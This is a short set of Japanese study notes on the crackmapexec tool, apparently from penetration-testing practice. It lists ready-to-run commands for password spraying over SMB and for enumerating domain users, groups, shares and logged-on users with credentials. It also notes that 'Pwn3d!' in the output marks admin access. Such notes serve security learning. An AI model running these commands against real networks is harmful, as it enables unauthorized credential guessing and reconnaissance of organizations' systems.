# crackmapexec
WindowsのAD環境に対して、列挙したユーザ名を使ったパスワードスプレーを実行できるツール。

## コマンド集

1. smbのIPを指定して、users.txt内のユーザ名に対し、-pで指定したパスワードのスプレーを行う。ドメインはcorp.comに設定。  
また、--continue-on-successで、有効な認証情報が最初に出た時に実行をストップせずスプレーを実行し続ける。  
ちなみに、出力に**Pwn3d!**が書いてあったら、そのユーザは管理者権限を持っていることになる。
```
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

2. ターゲット上のsmbでアクセスが許可されているふぁいるとふぉるだの一覧を取得する
```
crackmapexec 192.168.50.242 -u john -p "hoge" --shares
```

3. ドメイン内の全てのドメインユーザリストを取得するコマンド。この時、ドメインユーザの情報はDCが持っているので、ターゲットにDCのIPを指定する必要がある。
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

4. ドメイングループの全リストを列挙することも可能。
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

5. DC以外をターゲットにして、その端末に現在ログインしているユーザを確認するコマンド。
```
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

6. --sharesによって、リモートホストで使用可能な共有フォルダと、各shareフォルダに対するユーザアカウントのアクセスレベルが分かる。smbmapのような機能。
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```